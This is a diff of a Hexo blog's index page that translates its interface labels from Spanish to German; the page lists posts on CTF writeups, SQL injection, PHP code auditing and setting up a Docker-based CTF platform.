               </span>
-              <span class="post-meta-item-text">Publicado el</span>
+              <span class="post-meta-item-text">Veröffentlicht am</span>
 
               
                 
               
 
-              <time title="Creado por: 2019-06-10 20:46:26" itemprop="dateCreated datePublished" datetime="2019-06-10T20:46:26+08:00">2019-06-10</time>
+              <time title="Erstellt: 2019-06-10 20:46:26" itemprop="dateCreated datePublished" datetime="2019-06-10T20:46:26+08:00">2019-06-10</time>
             </span>
           
             
@@ -847,8 +688,8 @@ getenv()        获取一个环境变量的值(在7.1之后可以不给予参数
                 <span class="post-meta-item-icon">
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
-                <span class="post-meta-item-text">Editado el</span>
-                <time title="Modificado por: 2019-08-23 14:17:36" itemprop="dateModified" datetime="2019-08-23T14:17:36+08:00">2019-08-23</time>
+                <span class="post-meta-item-text">Bearbeitet am</span>
+                <time title="Geändert am: 2019-08-23 14:17:36" itemprop="dateModified" datetime="2019-08-23T14:17:36+08:00">2019-08-23</time>
               </span>
             
           
@@ -856,7 +697,7 @@ getenv()        获取一个环境变量的值(在7.1之后可以不给予参数
               <span class="post-meta-item-icon">
                 <i class="fa fa-folder-o"></i>
               </span>
-              <span class="post-meta-item-text">En</span>
+              <span class="post-meta-item-text">in</span>
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/project/" itemprop="url" rel="index"><span itemprop="name">project</span></a></span>
 
@@ -894,7 +735,7 @@ getenv()        获取一个环境变量的值(在7.1之后可以不给予参数
           
             <div class="post-button text-center">
               <a class="btn" href="/2019/06/10/JSFinder/#more" rel="contents">
-                Leer más &raquo;
+                Weiterlesen &raquo;
               </a>
             </div>
           
@@ -947,13 +788,13 @@ getenv()        获取一个环境变量的值(在7.1之后可以不给予参数
               <span class="post-meta-item-icon">
                 <i class="fa fa-calendar-o"></i>
               </span>
-              <span class="post-meta-item-text">Publicado el</span>
+              <span class="post-meta-item-text">Veröffentlicht am</span>
 
               
                 
               
 
-              <time title="Creado por: 2019-06-09 12:37:58" itemprop="dateCreated datePublished" datetime="2019-06-09T12:37:58+08:00">2019-06-09</time>
+              <time title="Erstellt: 2019-06-09 12:37:58" itemprop="dateCreated datePublished" datetime="2019-06-09T12:37:58+08:00">2019-06-09</time>
             </span>
           
             
@@ -963,8 +804,8 @@ getenv()        获取一个环境变量的值(在7.1之后可以不给予参数
                 <span class="post-meta-item-icon">
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
-                <span class="post-meta-item-text">Editado el</span>
-                <time title="Modificado por: 2019-08-23 14:19:14" itemprop="dateModified" datetime="2019-08-23T14:19:14+08:00">2019-08-23</time>
+                <span class="post-meta-item-text">Bearbeitet am</span>
+                <time title="Geändert am: 2019-08-23 14:19:14" itemprop="dateModified" datetime="2019-08-23T14:19:14+08:00">2019-08-23</time>
               </span>
             
           
@@ -972,7 +813,7 @@ getenv()        获取一个环境变量的值(在7.1之后可以不给予参数
               <span class="post-meta-item-icon">
                 <i class="fa fa-folder-o"></i>
               </span>
-              <span class="post-meta-item-text">En</span>
+              <span class="post-meta-item-text">in</span>
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Learning/" itemprop="url" rel="index"><span itemprop="name">Learning</span></a></span>
 
@@ -1028,7 +869,7 @@ moctfb1ind_SQL_1njecti0n_g0od
           
             <div class="post-button text-center">
               <a class="btn" href="/2019/06/09/从CTF题中学习几种有趣(奇怪)的SQL注入/#more" rel="contents">
-                Leer más &raquo;
+                Weiterlesen &raquo;
               </a>
             </div>
           
@@ -1081,13 +922,13 @@ moctfb1ind_SQL_1njecti0n_g0od
               <span class="post-meta-item-icon">
                 <i class="fa fa-calendar-o"></i>
               </span>
-              <span class="post-meta-item-text">Publicado el</span>
+              <span class="post-meta-item-text">Veröffentlicht am</span>
 
               
                 
               
 
-              <time title="Creado por: 2019-06-06 15:03:40" itemprop="dateCreated datePublished" datetime="2019-06-06T15:03:40+08:00">2019-06-06</time>
+              <time title="Erstellt: 2019-06-06 15:03:40" itemprop="dateCreated datePublished" datetime="2019-06-06T15:03:40+08:00">2019-06-06</time>
             </span>
           
             
@@ -1097,8 +938,8 @@ moctfb1ind_SQL_1njecti0n_g0od
                 <span class="post-meta-item-icon">
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
-                <span class="post-meta-item-text">Editado el</span>
-                <time title="Modificado por: 2019-08-23 14:19:25" itemprop="dateModified" datetime="2019-08-23T14:19:25+08:00">2019-08-23</time>
+                <span class="post-meta-item-text">Bearbeitet am</span>
+                <time title="Geändert am: 2019-08-23 14:19:25" itemprop="dateModified" datetime="2019-08-23T14:19:25+08:00">2019-08-23</time>
               </span>
             
           
@@ -1106,7 +947,7 @@ moctfb1ind_SQL_1njecti0n_g0od
               <span class="post-meta-item-icon">
                 <i class="fa fa-folder-o"></i>
               </span>
-              <span class="post-meta-item-text">En</span>
+              <span class="post-meta-item-text">in</span>
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Learning/" itemprop="url" rel="index"><span itemprop="name">Learning</span></a></span>
 
@@ -1154,7 +995,7 @@ sudo chmod +x /usr/local/bin/docker-compose
           
             <div class="post-button text-center">
               <a class="btn" href="/2019/06/06/初探Docker之搭建CTF平台/#more" rel="contents">
-                Leer más &raquo;
+                Weiterlesen &raquo;
               </a>
             </div>
           
@@ -1207,13 +1048,13 @@ sudo chmod +x /usr/local/bin/docker-compose
               <span class="post-meta-item-icon">
                 <i class="fa fa-calendar-o"></i>
               </span>
-              <span class="post-meta-item-text">Publicado el</span>
+              <span class="post-meta-item-text">Veröffentlicht am</span>
 
               
                 
               
 
-              <time title="Creado por: 2019-05-29 00:00:00" itemprop="dateCreated datePublished" datetime="2019-05-29T00:00:00+08:00">2019-05-29</time>
+              <time title="Erstellt: 2019-05-29 00:00:00" itemprop="dateCreated datePublished" datetime="2019-05-29T00:00:00+08:00">2019-05-29</time>
             </span>
           
             
@@ -1223,8 +1064,8 @@ sudo chmod +x /usr/local/bin/docker-compose
                 <span class="post-meta-item-icon">
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
-                <span class="post-meta-item-text">Editado el</span>
-                <time title="Modificado por: 2019-08-23 14:18:08" itemprop="dateModified" datetime="2019-08-23T14:18:08+08:00">2019-08-23</time>
+                <span class="post-meta-item-text">Bearbeitet am</span>
+                <time title="Geändert am: 2019-08-23 14:18:08" itemprop="dateModified" datetime="2019-08-23T14:18:08+08:00">2019-08-23</time>
               </span>
             
           
@@ -1232,7 +1073,7 @@ sudo chmod +x /usr/local/bin/docker-compose
               <span class="post-meta-item-icon">
                 <i class="fa fa-folder-o"></i>
               </span>
-              <span class="post-meta-item-text">En</span>
+              <span class="post-meta-item-text">in</span>
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/代码审计/" itemprop="url" rel="index"><span itemprop="name">代码审计</span></a></span>
 
@@ -1284,7 +1125,7 @@ sudo chmod +x /usr/local/bin/docker-compose
           
             <div class="post-button text-center">
               <a class="btn" href="/2019/05/29/PHP代码审计之SQL注入与审计流程/#more" rel="contents">
-                Leer más &raquo;
+                Weiterlesen &raquo;
               </a>
             </div>
           
@@ -1337,13 +1178,13 @@ sudo chmod +x /usr/local/bin/docker-compose
               <span class="post-meta-item-icon">
                 <i class="fa fa-calendar-o"></i>
               </span>
-              <span class="post-meta-item-text">Publicado el</span>
+              <span class="post-meta-item-text">Veröffentlicht am</span>
 
               
                 
               
 
-              <time title="Creado por: 2019-05-26 17:14:26" itemprop="dateCreated datePublished" datetime="2019-05-26T17:14:26+08:00">2019-05-26</time>
+              <time title="Erstellt: 2019-05-26 17:14:26" itemprop="dateCreated datePublished" datetime="2019-05-26T17:14:26+08:00">2019-05-26</time>
             </span>
           
             
@@ -1353,8 +1194,8 @@ sudo chmod +x /usr/local/bin/docker-compose
                 <span class="post-meta-item-icon">
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
-                <span class="post-meta-item-text">Editado el</span>
-                <time title="Modificado por: 2019-08-23 14:19:37" itemprop="dateModified" datetime="2019-08-23T14:19:37+08:00">2019-08-23</time>
+                <span class="post-meta-item-text">Bearbeitet am</span>
+                <time title="Geändert am: 2019-08-23 14:19:37" itemprop="dateModified" datetime="2019-08-23T14:19:37+08:00">2019-08-23</time>
               </span>
             
           
@@ -1362,7 +1203,7 @@ sudo chmod +x /usr/local/bin/docker-compose
               <span class="post-meta-item-icon">
                 <i class="fa fa-folder-o"></i>
               </span>
-              <span class="post-meta-item-text">En</span>
+              <span class="post-meta-item-text">in</span>
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Writeup/" itemprop="url" rel="index"><span itemprop="name">Writeup</span></a></span>
 
@@ -1401,7 +1242,7 @@ Register.php     //注册
           
             <div class="post-button text-center">
               <a class="btn" href="/2019/05/26/强网杯upload Writeup与简单分析/#more" rel="contents">
-                Leer más &raquo;
+                Weiterlesen &raquo;
               </a>
             </div>
           
@@ -1454,13 +1295,13 @@ Register.php     //注册
               <span class="post-meta-item-icon">
                 <i class="fa fa-calendar-o"></i>
               </span>
-              <span class="post-meta-item-text">Publicado el</span>
+              <span class="post-meta-item-text">Veröffentlicht am</span>
 
               
                 
               
 
-              <time title="Creado por: 2019-05-18 00:00:00" itemprop="dateCreated datePublished" datetime="2019-05-18T00:00:00+08:00">2019-05-18</time>
+              <time title="Erstellt: 2019-05-18 00:00:00" itemprop="dateCreated datePublished" datetime="2019-05-18T00:00:00+08:00">2019-05-18</time>
             </span>
           
             
@@ -1470,8 +1311,8 @@ Register.php     //注册
                 <span class="post-meta-item-icon">
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
-                <span class="post-meta-item-text">Editado el</span>
-                <time title="Modificado por: 2019-08-23 14:08:41" itemprop="dateModified" datetime="2019-08-23T14:08:41+08:00">2019-08-23</time>
+                <span class="post-meta-item-text">Bearbeitet am</span>
+                <time title="Geändert am: 2019-08-23 14:08:41" itemprop="dateModified" datetime="2019-08-23T14:08:41+08:00">2019-08-23</time>
               </span>
             
           
@@ -1479,7 +1320,7 @@ Register.php     //注册
               <span class="post-meta-item-icon">
                 <i class="fa fa-folder-o"></i>
               </span>
-              <span class="post-meta-item-text">En</span>
+              <span class="post-meta-item-text">in</span>
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/代码审计/" itemprop="url" rel="index"><span itemprop="name">代码审计</span></a></span>
 
@@ -1528,7 +1369,7 @@ Register.php     //注册
           
             <div class="post-button text-center">
               <a class="btn" href="/2019/05/18/PHP代码审计之重装漏洞/#more" rel="contents">
-                Leer más &raquo;
+                Weiterlesen &raquo;
               </a>
             </div>
           
@@ -1555,7 +1396,7 @@ Register.php     //注册
 
   
   <nav class="pagination">
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="Página siguiente"></i></a>
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="Nächste Seite"></i></a>
   </nav>
 
 
@@ -1578,10 +1419,10 @@ Register.php     //注册
 
       <ul class="sidebar-nav motion-element">
         <li class="sidebar-nav-toc" data-target="post-toc-wrap">
-          Tabla de contenidos
+          Inhaltsverzeichnis
         </li>
         <li class="sidebar-nav-overview" data-target="site-overview-wrap">
-          Inicio
+          Übersicht
         </li>
       </ul>
 
@@ -1602,7 +1443,7 @@ Register.php     //注册
           <a href="/archives/">
         
           <span class="site-state-item-count">27</span>
-          <span class="site-state-item-name">entradas</span>
+          <span class="site-state-item-name">Artikel</span>
         </a>
       </div>
     
@@ -1623,7 +1464,7 @@ Register.php     //注册
           
         
         <span class="site-state-item-count">5</span>
-        <span class="site-state-item-name">categorías</span>
+        <span class="site-state-item-name">Kategorien</span>
         
       </div>
     
@@ -1672,7 +1513,7 @@ Register.php     //注册
           
         
         <span class="site-state-item-count">19</span>
-        <span class="site-state-item-name">tags</span>
+        <span class="site-state-item-name">schlagwörter</span>
         
       </div>
     
@@ -1723,9 +1564,9 @@ Register.php     //注册
   </span>
   <span class="author" itemprop="copyrightHolder">Threezh1</span>
 </div>
-  <div class="powered-by">Creado mediante <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.8.0</div>
+  <div class="powered-by">Erstellt mit  <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.8.0</div>
   <span class="post-meta-divider">|</span>
-  <div class="theme-info">Tema – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> v7.3.0</div>
+  <div class="theme-info">Design – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> v7.3.0</div>
 
         
 
